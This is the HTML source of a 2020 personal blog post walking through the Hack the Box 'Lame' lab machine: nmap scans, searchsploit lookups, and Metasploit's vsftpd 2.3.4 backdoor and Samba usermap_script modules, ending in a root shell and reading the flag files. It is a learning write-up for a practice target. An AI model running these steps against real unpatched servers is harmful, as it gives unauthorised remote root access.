@@ -1,0 +1,1497 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-mode="dark">
+  <head prefix="og: http://ogp.me/ns#">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hugo 0.74.3 -- gohugo.io / Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<title>Walkthrough of Lame Machine – Hack the Box | Somerset&#39;s Blog</title>
+
+
+<meta name="author" content="Somerset">
+
+
+
+<meta name="robots" content="index follow">
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+
+
+
+  
+    <link rel="canonical" href="https://s0merset7.github.io/posts/lame_machine/">
+  
+
+
+
+
+
+
+
+
+<meta property="og:site_name" content="Somerset&#39;s Blog">
+<meta property="og:title" content="Walkthrough of Lame Machine – Hack the Box">
+
+  <meta property="og:url" content="https://s0merset7.github.io/posts/lame_machine/">
+
+
+
+
+
+
+
+
+  <meta property="og:type" content="article">
+  
+  
+    <meta property="article:published_time" content="2020-08-23">
+    <meta property="article:modified_time" content="2020-08-23">
+    <meta property="og:updated_time" content="2020-08-23">
+  
+
+  
+  
+  
+    <meta name="twitter:creator" content="@s0merset7">
+  
+  
+
+  <meta name="twitter:site" content="@s0merset7">
+
+
+
+
+
+
+
+  <meta name="twitter:dnt" content="on">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="theme-color" content="#222">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+
+
+
+
+
+
+
+
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+    
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+        
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+        
+      
+      
+    
+
+  
+
+    
+    
+
+    
+    
+      
+      
+    
+
+  
+
+    
+    
+
+    
+    
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+    
+      
+      
+    
+
+  
+
+    
+    
+
+    
+    
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+    
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+        
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+    
+    
+
+    
+
+      
+      
+    
+
+  
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebSite",
+        "@id": "https:\/\/s0merset7.github.io\/"
+      },
+      "headline": "Walkthrough of Lame Machine – Hack the Box",
+      "description": "",
+      
+      "url": "https:\/\/s0merset7.github.io\/posts\/lame_machine\/",
+      "inLanguage": "en",
+      "datePublished": "2020-08-23",
+      "dateModified": "2020-08-23",
+      "wordCount" : "857",
+      "publisher": {
+        "@type": "Person",
+        "name": "Somerset"
+      },
+      "author": {
+        "@type": "Person",
+        "name": "Somerset",
+        "description": "Some indescribable horror.",
+        "sameAs": ["https://github.com/s0merset7","https://www.linkedin.com/in/ryan-dinnan","https://twitter.com/s0merset7"]
+      }
+    }
+  </script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.46f9974dbd84e826ea113220f8fa8b1b862024b9588a4940f415ca16bc4e38fb7f345fb5e8881f7e5680d1237f05d359208acd0a4344e76fea4a90135f604c06.css" integrity="sha512-RvmXTb2E6CbqETIg&#43;PqLG4YgJLlYiklA9BXKFrxOOPt/NF&#43;16IgfflaA0SN/BdNZIIrNCkNE52/qSpATX2BMBg==">
+
+
+
+<noscript>
+
+  
+  
+
+  
+
+    
+      <meta name="theme-color" content="#dd587c">
+    
+
+  
+
+  <style>
+  
+    html {
+      --accent: #dd587c;
+    }
+  
+    .req-js,
+    img.lazyload {
+      display: none;
+    }
+    
+  </style>
+  
+</noscript>
+
+
+
+
+
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-700.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/oswald-v29-latin-700.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">
+
+
+
+
+
+<script defer src="/js/lazysizes.min.min.a85a0eccaf9ef0d2f083a9dc4d0e05dc90acc5be0e84b43e20fde692871e1861ae0191f7c3ca2c00f2664efabf6aff2625a478b8f22ea43cb056cb6ec9a8d948.js" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  <link rel="me" href="https://github.com/s0merset7"> 
+
+  <link rel="me" href="https://www.linkedin.com/in/ryan-dinnan"> 
+
+  <link rel="me" href="https://twitter.com/s0merset7"> 
+
+
+
+
+
+
+
+  <script>
+    
+      'use strict';const ROOT=document.documentElement;const SHEET=document.documentElement.style;const META_THEME_COLOR=document.querySelector('meta[name=theme-color]');function setDark(){ROOT.dataset.mode='dark'};function setLight(){ROOT.dataset.mode='light'};if(localStorage.getItem('isDark')=='true'){setDark()}else if(localStorage.getItem('isDark')=='false'){setLight()};function getAccent(){if(ROOT.dataset.mode==='dark'){if(localStorage.getItem('darkAccent')===null){var currentAccent="#dd587c"}else{var currentAccent=localStorage.getItem('darkAccent')
+}}else if(ROOT.dataset.mode==='light'){if(localStorage.getItem('lightAccent')===null){var currentAccent="#225670"}else{var currentAccent=localStorage.getItem('lightAccent')
+}};return currentAccent};var activeAccent=getAccent();SHEET.setProperty('--accent',activeAccent);META_THEME_COLOR.setAttribute('content',activeAccent);function updateAccent(){var activeAccent=getAccent();SHEET.setProperty('--accent',activeAccent);PALETTE.value=activeAccent;META_THEME_COLOR.setAttribute('content',activeAccent);};document.addEventListener('DOMContentLoaded',function(){PALETTE.value=activeAccent;function smoothTransition(){document.body.style.transition=document.querySelector('header').style.transition=document.querySelector('footer').style.transition='background-color .3s ease, color .3s ease'};function userModeChange(){smoothTransition();if(ROOT.dataset.mode=='light'){setDark();localStorage.setItem('isDark','true')
+}else{setLight();localStorage.setItem('isDark','false')
+};updateAccent()};document.querySelector('footer button').addEventListener('click',userModeChange)})
+    
+  </script>
+
+
+
+  </head>
+
+  <body>
+
+    <header>
+      
+
+  <a href="/">Somerset&#39;s Blog</a>
+
+
+
+
+  
+    <nav aria-label="Main menu.">
+      <ul>
+        
+          <li>
+            <a class="btn" href="/about/">About</a>
+          </li>
+        
+          <li>
+            <a class="btn" href="/posts/">Posts</a>
+          </li>
+        
+          <li>
+            <a class="btn" href="/contact/">Contact</a>
+          </li>
+        
+      </ul>
+    </nav>
+  
+
+
+    </header>
+
+    <div class="filler">
+      
+
+  <main>
+    <article>
+      <header>
+        
+        <h1>Walkthrough of Lame Machine – Hack the Box</h1>
+        
+        
+
+        
+          <section class="terms">
+            <ul><li><a class="btn" href="/tags/hackthebox/">HacktheBox</a></li><li><a class="btn" href="/tags/walkthrough/">Walkthrough</a></li></ul>
+          </section>
+          <p>
+            
+              Published on <time datetime="2020-08-23">2020-08-23</time>
+            
+          </p>
+        
+        
+        
+        
+      </header>
+    
+      
+      
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+<ol>
+<li>
+<p>In a new terminal window, run <code>nmap -sV -O -F --version-light 10.10.10.3</code>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726880-9b4c8980-d9d4-11ea-9c66-4269c021413f.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726880-9b4c8980-d9d4-11ea-9c66-4269c021413f.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+<ul>
+<li>Another option is to open <strong>Zenmap</strong> and run a port scan on the same IP (to see just the information on the ports, you can go to the <strong>Ports/Hosts</strong> tab)
+<ul>
+<li><strong>Zenmap</strong> is a program that does a really good job at visualizing and breaking down <code>nmap</code> commands into digestible bites
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726888-b7502b00-d9d4-11ea-9a64-1e5bd559f122.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726888-b7502b00-d9d4-11ea-9a64-1e5bd559f122.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726889-b8815800-d9d4-11ea-8bab-4a7be888eae5.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726889-b8815800-d9d4-11ea-8bab-4a7be888eae5.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</li>
+</ul>
+</li>
+<li>Now there a a LOT of different ways to use <code>nmap</code>, and being that I&rsquo;m still learning you are going to be seeing a lot of different versions, but I will do my best to explain what each version does. The two versions used here I got from other tutorials and show different levels of detail when port scanning.
+<ul>
+<li>The first version we used was <code>nmap -sV -O -F --version-light 10.10.10.3</code>
+<ul>
+<li><code>-sV</code>: Probes open ports to determine service/version info</li>
+<li><code>-O</code>: Enable OS detection</li>
+<li><code>-F</code>: Fast mode, scans fewer ports than the default scan</li>
+<li><code>--version-light</code>: Limit to most likely probes</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>The second version used (as seen in the <strong>Zenmap</strong> screenshot) was <code>nmap -A -v 10.10.10.3</code>
+<ul>
+<li><code>-A</code>: Enable OS detection, version detection, script scanning, and traceroute</li>
+<li><code>-v</code>: Increase verbosity level (how detailed the process and results are)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>You’ll find that there are 4 available ports with different services running on them (21, 22, 139, 445)</p>
+</li>
+<li>
+<p>Port 21 shows <strong>vsftpd 2.3.4</strong>, let’s check if there are any known vulnerabilities</p>
+</li>
+<li>
+<p>Run command <code>searchsploit vsftpd 2.3.4</code></p>
+<ul>
+<li>What this does is search for any <a href="https://cve.mitre.org/about/index.html">Common Vulnerability and Exploits (CVE)</a> and returns the name and location of the exploit in Kali
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726895-be773900-d9d4-11ea-8b21-a2ea0eb85645.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726895-be773900-d9d4-11ea-8b21-a2ea0eb85645.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</li>
+</ul>
+</li>
+<li>
+<p>You&rsquo;ll see that there is one vulnerability, a <em>&ldquo;Backdoor Command Execution&rdquo;</em></p>
+</li>
+<li>
+<p>We can try and use this vulnerability with <strong>Metasploit</strong></p>
+<ul>
+<li><strong>Metasploit</strong> is a very nifty software that has a bunch of CVE exploits saved that can be run automatically</li>
+</ul>
+</li>
+<li>
+<p>Open <strong>Metasploit</strong> and use the command <code>search vsftpd 2.3.4</code>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726896-bfa86600-d9d4-11ea-9c96-eed449fe639d.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726896-bfa86600-d9d4-11ea-9c96-eed449fe639d.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>You&rsquo;ll see 4 different options, and the fourth one will be our <em>&ldquo;Backdoor Command Execution&rdquo;</em> exploit</p>
+</li>
+<li>
+<p>Copy the address and run <code>use exploit/unix/ftp/vsftpd_234_backdoor</code></p>
+</li>
+<li>
+<p>Type <code>show options</code> and we&rsquo;ll see that we need to set <strong>RHOSTS</strong> to the desired IP
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726897-c040fc80-d9d4-11ea-8180-bbc1cf91524f.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726897-c040fc80-d9d4-11ea-8180-bbc1cf91524f.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>Do <code>set rhost 10.10.10.3</code></p>
+</li>
+<li>
+<p>If we do <code>show options</code> again, then we&rsquo;ll see its set and can type <code>run</code></p>
+<ul>
+<li>What this does is tell <strong>Metalsploit</strong> where to direct the exploit
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726898-c0d99300-d9d4-11ea-85af-1a4a549e7948.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726898-c0d99300-d9d4-11ea-85af-1a4a549e7948.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</li>
+</ul>
+</li>
+<li>
+<p>After a little bit, we&rsquo;ll get a message saying, <em>“Exploit completed, but no session was created”</em>,    meaning that the exploit was attempted but didn’t&rsquo; work (if we do some <a href="https://www.exploit-db.com/exploits/17491">research</a>, it turns out that this exploit had since been fixed which is why our attempt failed)
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726899-c1722980-d9d4-11ea-95b4-e9fb64ffb433.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726899-c1722980-d9d4-11ea-95b4-e9fb64ffb433.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>Let&rsquo;s continue to check the other option on port 139, <strong>Samba</strong></p>
+</li>
+<li>
+<p>Run <code>search Samba 3.0.20</code> (which we know from our port scan) and we see two results.
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726900-c20ac000-d9d4-11ea-9099-911a217b2ce9.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726900-c20ac000-d9d4-11ea-9099-911a217b2ce9.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>We&rsquo;re going to want to focus on the first result, <em>&quot;&lsquo;Username map script&rsquo; Command Execution&rdquo;</em></p>
+</li>
+<li>
+<p>We search that vulnerability in <strong>Metasploit</strong> with <code>searchsploit Samba 3.0.20</code>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726901-c20ac000-d9d4-11ea-85e7-e2c36f8375e4.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726901-c20ac000-d9d4-11ea-85e7-e2c36f8375e4.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>We got a lot more options this time, but if we scroll through we see that option 15 is our <em>&ldquo;username map script&rdquo; Command Execution</em> vulnerability and copy the address and run <code>use exploit/multi/samba/usermap_script</code></p>
+</li>
+<li>
+<p>Again we look at the settings and change the <strong>RHOSTS</strong> to our IP with show options and <code>set rhost 10.10.10.3</code> and then we&rsquo;re good to <code>run</code>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726902-c2a35680-d9d4-11ea-9203-f5b35506d1b9.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726902-c2a35680-d9d4-11ea-9203-f5b35506d1b9.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>Chances are (unless you set it up before), you&rsquo;ll get the same message from when we ran the <strong>vsftpd 2.3.4 exploit</strong> <em>“Exploit completed, but no session was created”</em>, but if you run <code>show options</code> again, you&rsquo;ll see a new section
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726903-c2a35680-d9d4-11ea-90b9-85e20e6f1227.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726903-c2a35680-d9d4-11ea-90b9-85e20e6f1227.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>Now we have an <strong>LHOST</strong> and <strong>LPORT</strong> section, but the natural <strong>LHOST</strong> is not what we want because HTB gives us our own local IP for when we are on its VPN. You can find yours in the <strong>Access</strong> settings on the HTB website
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726904-c33bed00-d9d4-11ea-9645-090c1b55201a.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726904-c33bed00-d9d4-11ea-9645-090c1b55201a.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>Run <code>set lhost yourHtbIp</code> and then try <code>run</code> again</p>
+</li>
+<li>
+<p>You should see some new messages and after a few seconds one that says, <em>“Command shell session 1 opened”</em>, and we&rsquo;re in!
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726905-c33bed00-d9d4-11ea-8fbf-1b58f3e2a092.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726905-c33bed00-d9d4-11ea-8fbf-1b58f3e2a092.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>Now that we have a shell, we can check what kind of privileges we have with <code>whoami</code></p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726906-c3d48380-d9d4-11ea-90be-560bf8e6e84f.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726906-c3d48380-d9d4-11ea-90be-560bf8e6e84f.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</p>
+</li>
+<li>
+<p>Turns out we are already in as the root user! Now all we need to do is find the password hashes under user.txt and root.txt</p>
+</li>
+<li>
+<p>From here we have the option of either digging around in all the files and directories for what we want, or we can use this command <code>find / -type f -name “nameOfFile”</code> where nameOfFile will be replaced with user.txt and root.txt</p>
+<ul>
+<li>This command will return the file address of whatever file you put in place of <em>&ldquo;nameOfFile&rdquo;</em>. We know what to search for because HTB machines often store the user and root hashes in files named user.txt and root.txt
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+    <img
+      class="lazyload "
+      loading="lazy"
+      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
+      data-src="https://user-images.githubusercontent.com/44144070/89726907-c3d48380-d9d4-11ea-9444-af9a860827a4.png"
+      alt="Image"
+    />
+    
+    <noscript>
+      <img
+        
+        loading="lazy"
+        src="https://user-images.githubusercontent.com/44144070/89726907-c3d48380-d9d4-11ea-9444-af9a860827a4.png"
+        alt="Image"
+      />
+    </noscript>
+  
+  
+
+</li>
+</ul>
+</li>
+<li>
+<p>Once we find the locations of the two files, we can just run <code>cat fileAddress</code> where fileAddress is what we got with the find command</p>
+</li>
+<li>
+<p>Take those hashes and submit them on your HTB account and get the points!</p>
+</li>
+</ol>
+
+
+
+
+
+  <h2 id="resources">Resources <a class="anchor" href="#resources" title='Anchor for "Resources".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a></h2> 
+
+<ul>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/1">Official Lame Writeup from Hack the Box</a></li>
+<li><a href="https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/">Tutorial from freecodecamp.org</a></li>
+<li><a href="https://nmap.org/book/man-briefoptions.html"><code>nmap</code> Command Help</a></li>
+</ul>
+
+
+
+
+
+  <h6 id="font-size1075-108-097-108-106-097-112-099-108-032-083-112-108-098-097-108-117-104-117-097-032-068-112-115-115-112-104-116-032-090-118-116-108-121-122-108-097font"><font size="1">075 108 097 108 106 097 112 099 108 032 083 112 108 098 097 108 117 104 117 097 032 068 112 115 115 112 104 116 032 090 118 116 108 121 122 108 097</font> <a class="anchor" href="#font-size1075-108-097-108-106-097-112-099-108-032-083-112-108-098-097-108-117-104-117-097-032-068-112-115-115-112-104-116-032-090-118-116-108-121-122-108-097font" title='Anchor for "075 108 097 108 106 097 112 099 108 032 083 112 108 098 097 108 117 104 117 097 032 068 112 115 115 112 104 116 032 090 118 116 108 121 122 108 097".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a></h6> 
+
+
+
+
+    </article>
+  </main>
+
+
+    </div>
+    
+    <footer>
+      
+
+  <p>Copyright © 2020
+All rights reserved</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="req-js">
+  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#dd587c" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#225670"><option value="#dd587c"><option value="#1f676b"><option value="#f3a530"><option value="#902b37"><option value="#1dbc91"><option value="#754e85"><option value="#7fc121"><option value="#a8314a"><option value="#ff7433"><option value="#3e6728"><option value="#c063bd"></datalist>
+</section>
+
+
+
+  <noscript>
+    <p class="noscript">Unable to execute JavaScript. Some features were disabled.</p>
+  </noscript>
+
+
+
+    </footer>
+    
+    <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" aria-hidden="true">
+      <symbol viewBox="0 0 512 512" id="adjust">
+        <path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705 0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/>
+      </symbol>
+      
+      
+      
+      
+  
+<symbol viewBox="0 0 448 512" id="hashtag">
+  <path d="M440.667 182.109l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l14.623-81.891C377.123 38.754 371.468 32 363.997 32h-40.632a12 12 0 0 0-11.813 9.891L296.175 128H197.54l14.623-81.891C213.477 38.754 207.822 32 200.35 32h-40.632a12 12 0 0 0-11.813 9.891L132.528 128H53.432a12 12 0 0 0-11.813 9.891l-7.143 40C33.163 185.246 38.818 192 46.289 192h74.81L98.242 320H19.146a12 12 0 0 0-11.813 9.891l-7.143 40C-1.123 377.246 4.532 384 12.003 384h74.81L72.19 465.891C70.877 473.246 76.532 480 84.003 480h40.632a12 12 0 0 0 11.813-9.891L151.826 384h98.634l-14.623 81.891C234.523 473.246 240.178 480 247.65 480h40.632a12 12 0 0 0 11.813-9.891L315.472 384h79.096a12 12 0 0 0 11.813-9.891l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l22.857-128h79.096a12 12 0 0 0 11.813-9.891zM261.889 320h-98.634l22.857-128h98.634l-22.857 128z"/>
+</symbol>
+
+
+  <symbol viewBox="0 0 320 512" id="caret-down">
+    <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"/>
+  </symbol>
+
+
+      
+      
+      
+    </svg>
+
+    
+    
+    
+
+      <script>
+        
+          'use strict';const PALETTE=document.querySelector('footer input');PALETTE.onchange=function(){const PICK=PALETTE.value;SHEET.setProperty('--accent',PICK);if(ROOT.dataset.mode==='light'){localStorage.setItem('lightAccent',PICK)}else{localStorage.setItem('darkAccent',PICK)};updateAccent()};
+        
+      </script>
+
+    
+    
+    
+    
+
+  </body>
+</html>
